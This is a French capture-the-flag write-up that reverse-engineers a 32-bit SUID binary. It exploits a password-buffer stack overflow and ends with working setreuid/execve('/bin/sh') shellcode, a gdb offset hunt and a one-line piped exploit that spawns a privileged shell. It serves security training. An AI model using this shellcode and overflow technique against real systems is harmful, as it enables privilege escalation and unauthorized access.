# level01

## 1. Analyse

### Chaînes et symboles

En désassemblant le binaire (`objdump -d level01`) et en extrayant les
chaînes (`.rodata`) ainsi que les symboles de données, on obtient :

```
┌───────────┬──────────────────────────────────────────┐
│  Adresse  │                  Chaîne                  │
├───────────┼──────────────────────────────────────────┤
│ 0x8048690 │ "verifying username....\n"               │
├───────────┼──────────────────────────────────────────┤
│ 0x80486a8 │ "dat_wil"                                │
├───────────┼──────────────────────────────────────────┤
│ 0x80486b0 │ "admin"                                  │
├───────────┼──────────────────────────────────────────┤
│ 0x80486b8 │ "********* ADMIN LOGIN PROMPT *********" │
├───────────┼──────────────────────────────────────────┤
│ 0x80486df │ "Enter Username: "                       │
├───────────┼──────────────────────────────────────────┤
│ 0x80486f0 │ "nope, incorrect username...\n"          │
├───────────┼──────────────────────────────────────────┤
│ 0x804870d │ "Enter Password: "                       │
├───────────┼──────────────────────────────────────────┤
│ 0x804871e │ "nope, incorrect password.."             │
└───────────┴──────────────────────────────────────────┘
```

Et les deux symboles de données :

- `0x804a040` = **`a_user_name`** — une variable globale dans `.bss`, taille
  déclarée `0x64` (100 octets).
- `0x804a020` = **`stdin`** (le `FILE*` recopié par la glibc).

### Fonctions `verify_` (user_name/user_pass)

Les deux utilisent le même idiome `repz cmpsb` + `seta`/`setb` :
```asm
mov    $src, %esi        ; esi = chaîne A
mov    $ref, %edi        ; edi = chaîne de référence
mov    $N,   %ecx         ; comparer N octets
repz cmpsb                ; tant qu'égal & ecx>0 : compare [esi++] et [edi++]
seta   %dl               ; dl = (A > ref) ? 1 : 0
setb   %al               ; al = (A < ref) ? 1 : 0
sub    %al, %cl ...      ; résultat = dl - al  →  -1 / 0 / +1
movsbl %al, %eax         ; extension de signe dans la valeur de retour
```
C'est un `memcmp`/`strncmp` *inline* généré par GCC, qui renvoie `0` si les octets sont égaux, non-zéro sinon. En résumé:

- **`verify_user_name`** : affiche `"verifying username...."` puis compare
  `a_user_name` (ce qu'on a tapé) avec `"dat_wil"` sur **7 octets**. Renvoie `0`
  si les 7 premiers caractères valent `dat_wil`.
- **`verify_user_pass`** : compare le buffer reçu en argument avec `"admin"` sur
  **5 octets**. Renvoie `0` si égal.

### `main` — le déroulement et les deux bugs

**`char buf[64];  int result = 0;`**

```asm
80484db:  lea    0x1c(%esp),%ebx           ; buf est à esp+0x1c
80484ed:  rep stos %eax,%es:(%edi)         ; 64 octets mis à 0  → buf[64]
80484ef:  movl   $0x0,0x5c(%esp)           ; result = 0  → result est à esp+0x5c
```

`result` (esp+0x5c) est donc **juste après** `buf` (esp+0x1c) :
`0x5c - 0x1c = 0x40 = 64` octets.

**`fgets(a_user_name, 0x100, stdin);`**

```asm
8048510:  mov    0x804a020,%eax            ; eax = stdin
8048515:  mov    %eax,0x8(%esp)            ; arg3 = stdin
8048519:  movl   $0x100,0x4(%esp)          ; arg2 = 0x100 (256)
8048521:  movl   $0x804a040,(%esp)         ; arg1 = a_user_name (variable globale, 100 octets)
8048528:  call   8048370 <fgets@plt>       ; fgets(a_user_name, 0x100, stdin) → 256 lus dans 100 octets
```

**`result = verify_user_name(); if (result != 0) {...}`**

```asm
804852d:  call   8048464 <verify_user_name>
8048532:  mov    %eax,0x5c(%esp)           ; result = retour
8048536:  cmpl   $0x0,0x5c(%esp)           ; result == 0 ?
...                                        ; non → "incorrect username" + return 1
804853b:  je     8048550                   ; oui → mot de passe
```

**`fgets(buf, 0x64, stdin); result = verify_user_pass(buf);`**

```asm
804855c:  mov    0x804a020,%eax            ; eax = stdin
8048561:  mov    %eax,0x8(%esp)            ; arg3 = stdin
8048565:  movl   $0x64,0x4(%esp)           ; arg2 = 0x64 (100)
804856d:  lea    0x1c(%esp),%eax           ; eax = &buf
8048571:  mov    %eax,(%esp)               ; arg1 = buf
8048574:  call   8048370 <fgets@plt>       ; fgets(buf, 0x64, stdin) → 100 > 64 : DÉBORDEMENT
8048580:  call   80484a3 <verify_user_pass>
8048585:  mov    %eax,0x5c(%esp)           ; result = retour
```

## 2. Reconnaissance

### **La branche « succès » est inatteignable avec un bon mot de passe** :
```asm
cmpl $0x0, result
je   8048597      ; si result==0  → saute vers "incorrect password"
cmpl $0x0, result
je   80485aa      ; si result==0  → saute vers le succès (return 0)
```
`result` est testé deux fois de suite (`je` vers l'échec si `== 0`, puis `je` vers le succès si `== 0`). Il faudrait `result != 0` ET `result == 0` en même temps, ce qui est impossible. Taper `admin` ne connecte donc jamais : la vérification du mot de passe n'est qu'un "bait" dont le seul vrai rôle est d'appeler `fgets` dans un buffer trop petit.

### **Débordement de pile** : 
Le `fgets` du mot de passe lit jusqu'à 100 octets (`0x64`) dans `buf` qui n'en fait que **64**. On peut donc écrire 36 octets au-delà — par-dessus `result`, les registres sauvegardés, et l'adresse de retour sauvegardée.

## 3. Exploitation

Le plan est classique : comme il n'y a ni canari ni `NX` sur la pile `.bss`, on
va (1) déposer un shellcode quelque part à une adresse **connue et fixe**, puis
(2) écraser l'adresse de retour sauvegardée de `main` via le débordement du mot
de passe pour sauter dessus.

### 3.1 Le shellcode

On utilise un shellcode `execve("/bin/sh")` de 41 octets, précédé d'un
`setreuid`. Le `setreuid` est **indispensable** : le binaire est SUID, et le
shell ne sera lancé avec les droits du propriétaire que si l'on restaure
explicitement l'UID effectif avant l'`execve` (sinon bash/dash « droppe » les
privilèges au démarrage).

```
\x31\xc0\xb0\x31\xcd\x80                          ; geteuid()
\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80          ; setreuid(euid, euid)
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80   ; execve("/bin/sh")
```

Désassemblé, instruction par instruction :

```asm
31 c0              xor    eax, eax        ; eax = 0
b0 31              mov    al, 0x31        ; 49 = geteuid
cd 80              int    0x80            ; eax = euid (ex: 1001)
89 c3              mov    ebx, eax        ; ebx = euid
89 c1              mov    ecx, eax        ; ecx = euid
31 c0              xor    eax, eax
b0 46              mov    al, 0x46        ; 70 = setreuid
cd 80              int    0x80            ; setreuid(euid, euid) → restaure les droits
31 c0              xor    eax, eax
50                 push   eax             ; '\0' terminateur de "/bin//sh"
68 2f 2f 73 68     push   0x68732f2f      ; "//sh"
68 2f 62 69 6e     push   0x6e69622f      ; "/bin"
89 e3              mov    ebx, esp        ; ebx = pointeur sur "/bin//sh"
50                 push   eax             ; NULL
53                 push   ebx             ; &"/bin//sh"
89 e1              mov    ecx, esp        ; ecx = argv = { "/bin//sh", NULL }
89 c2              mov    edx, eax        ; edx = envp = NULL
b0 0b              mov    al, 0x0b        ; 11 = execve
cd 80              int    0x80            ; execve("/bin//sh", argv, NULL)
```

Les octets sont tous non-nuls et ne contiennent ni `\x0a` (`\n`) ni `\x0d`,
donc ils passent sans problème au travers de `fgets` (qui s'arrête sur `\n`).

### 3.2 Où déposer le shellcode : dans le username

`verify_user_name` compare uniquement les **7 premiers octets** de
`a_user_name` avec `"dat_wil"`. Tout ce qui suit ces 7 octets est ignoré par la
vérification mais reste copié en mémoire par `fgets` (qui lit jusqu'à 256
octets dans le buffer global). On construit donc l'entrée *username* ainsi :

```
"dat_wil" + <shellcode de 41 octets>
   7 o.         41 o.
```

- les 7 premiers octets satisfont `verify_user_name` → on passe au mot de passe ;
- le shellcode est écrit juste derrière.

`a_user_name` est une **variable globale** (`.bss`), donc son adresse est
**fixe** d'une exécution à l'autre : `0x804a040` (cf. partie 1). Le shellcode
commençant immédiatement après les 7 octets de `"dat_wil"`, son adresse est :

```
a_user_name + 7 = 0x804a040 + 7 = 0x804a047
```

C'est cette adresse, en little-endian `\x47\xa0\x04\x08`, qu'on va faire pointer
par l'adresse de retour.

### 3.3 Trouver l'offset de l'adresse de retour

`buf` est à `esp+0x1c`, mais le prologue de `main` fait
`and esp, 0xfffffff0` : l'alignement de pile décale `buf` par rapport à l'EBP
sauvegardé d'une quantité **non déterministe à la lecture du désassemblage**.
On ne peut donc pas déduire l'offset « à la main » — on le trouve
**expérimentalement** avec un motif cyclique où chaque sous-chaîne de 4 octets
est unique :

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2
```


On l'envoie comme **mot de passe**, le username restant valide :

```
gdb ./level01
(gdb) run
...
Enter Username: dat_wil
...
Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2

```

Au `ret`, `main` saute à l'adresse formée par les 4 octets du motif qui sont
tombés sur l'adresse de retour sauvegardée → **SEGFAULT**, et `eip` contient
exactement ces 4 octets :

```
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Il suffit alors de chercher la position de cette sous-chaîne dans le motif. `0x37634136` est l'écriture little-endian des octets `36 41 63 37` = `"6Ac7"`, dont la position
dans le motif est **80**.

→ L'adresse de retour se trouve donc **80 octets après le début de `buf`**.

### 3.4 Payload final

```
username :  "dat_wil" + shellcode(41 o.)
password :  "A" * 80  +  "\x47\xa0\x04\x08"
             (remplissage)   (= a_user_name + 7)
```

À l'exécution, `main` lit le mot de passe de 84 octets dans `buf[64]`, écrase
l'adresse de retour avec `0x804a047`, et au `ret` l'exécution saute sur le
shellcode déposé dans `a_user_name`, qui exécute `/bin/sh` avec les droits du
propriétaire du binaire.

```sh
{ python -c 'print "dat_wil" + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'; sleep 1; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat; } | ./level01
```